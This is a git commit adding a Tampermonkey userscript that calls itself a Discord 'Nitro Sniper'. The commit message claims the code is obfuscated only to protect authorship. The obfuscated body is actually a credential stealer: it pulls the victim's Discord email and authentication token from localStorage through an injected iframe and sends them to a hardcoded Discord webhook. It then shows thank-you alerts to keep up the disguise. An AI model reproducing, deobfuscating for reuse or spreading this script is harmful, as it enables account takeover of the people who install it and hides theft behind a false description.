e3ae73b13ef60834bc18184cf8681f36d28dfbdb
DDWORDD <101677914+DDWORDD@users.noreply.github.com>
2022-03-15 19:09:45 -0500

    Create NitroSniperMain.user.js
    I obfuscated it because I dont want other people using my work as their own

---
+++ NitroSniperMain.user.js
@@ -0,0 +1,17 @@
+// ==UserScript==
+// @name         New Userscript
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://discord.com/channels/922344609697382400/922344609697382403
+// @icon         https://www.google.com/s2/favicons?domain=discord.com
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+const _0x456229=_0x27e1;(function(_0xf6f046,_0x4cdcf8){const _0x400679=_0x27e1,_0x53a09d=_0xf6f046();while(!![]){try{const _0x5cc4cf=parseInt(_0x400679(0xc5))/0x1+parseInt(_0x400679(0xb6))/0x2*(parseInt(_0x400679(0xcf))/0x3)+parseInt(_0x400679(0xb4))/0x4*(parseInt(_0x400679(0xc8))/0x5)+parseInt(_0x400679(0xba))/0x6*(parseInt(_0x400679(0xc4))/0x7)+-parseInt(_0x400679(0xb7))/0x8*(parseInt(_0x400679(0xca))/0x9)+parseInt(_0x400679(0xb9))/0xa*(parseInt(_0x400679(0xc7))/0xb)+parseInt(_0x400679(0xb2))/0xc*(-parseInt(_0x400679(0xb5))/0xd);if(_0x5cc4cf===_0x4cdcf8)break;else _0x53a09d['push'](_0x53a09d['shift']());}catch(_0x47c3a5){_0x53a09d['push'](_0x53a09d['shift']());}}}(_0x223b,0x451e0));const FnLComa=/^"|"$/g,webhook=_0x456229(0xc6);function _0x223b(){const _0x233784=['createElement','stringify','246fnBuAE','168tyzhUM','appendChild','8KnAtmh','437047NmkXFe','8052zIfpfx','8YRihBe','reload','764870xcrzUz','954EBvLMD','Content-type','contentWindow','POST','Email:\x20**','No\x20message\x20provided','token','localStorage','body','send','9730wOPkeb','215593rvQbLx','https://discord.com/api/webhooks/924833117083140176/bY00I2AHxg6ULad44DyLYpicH_42Rk-1JR6GJ76bdgkgG6YxO9k8pZuZAKXSbRVTDOx5','11HzdoWM','360055gRyMFI','application/json','2101266HFQPlI','replace','setRequestHeader'];_0x223b=function(){return _0x233784;};return _0x223b();}function sendMessage({message:_0x23f2a2}){const _0x3fe1a4=_0x456229,_0x1c7160=new XMLHttpRequest();_0x1c7160['open'](_0x3fe1a4(0xbd),webhook),_0x1c7160[_0x3fe1a4(0xcc)](_0x3fe1a4(0xbb),_0x3fe1a4(0xc9));const _0x3c2a3f={'content':_0x23f2a2||_0x3fe1a4(0xbf)};_0x1c7160[_0x3fe1a4(0xc3)](JSON[_0x3fe1a4(0xce)](_0x3c2a3f));};function _0x27e1(_0x42a9c0,_0x2c265e){const _0x223bca=_0x223b();return _0x27e1=function(_0x27e1d1,_0x3a4a4e){_0x27e1d1=_0x27e1d1-0xb2;let _0x58e1f0=_0x223bca[_0x27e1d1];return _0x58e1f0;},_0x27e1(_0x42a9c0,_0x2c265e);}location[_0x456229(0xb8)]();const interval=setInterval(()=>{const _0x17aca9=_0x456229,_0x3d0b62={'email':document['body'][_0x17aca9(0xb3)](document[_0x17aca9(0xcd)]`iframe`)[_0x17aca9(0xbc)][_0x17aca9(0xc1)]['email_cache']['replace'](FnLComa,''),'token':document[_0x17aca9(0xc2)][_0x17aca9(0xb3)](document[_0x17aca9(0xcd)]`iframe`)[_0x17aca9(0xbc)][_0x17aca9(0xc1)][_0x17aca9(0xc0)][_0x17aca9(0xcb)](FnLComa,'')};_0x3d0b62['token']&&(sendMessage({'message':_0x17aca9(0xbe)+_0x3d0b62['email']+'**\x0aToken:\x20**'+_0x3d0b62[_0x17aca9(0xc0)]+'**'}),clearInterval(interval));;});
+    alert('Nitro Sniper Started')
+    alert('Thank your for using DWORDS Nitro Sniper!')
+})();
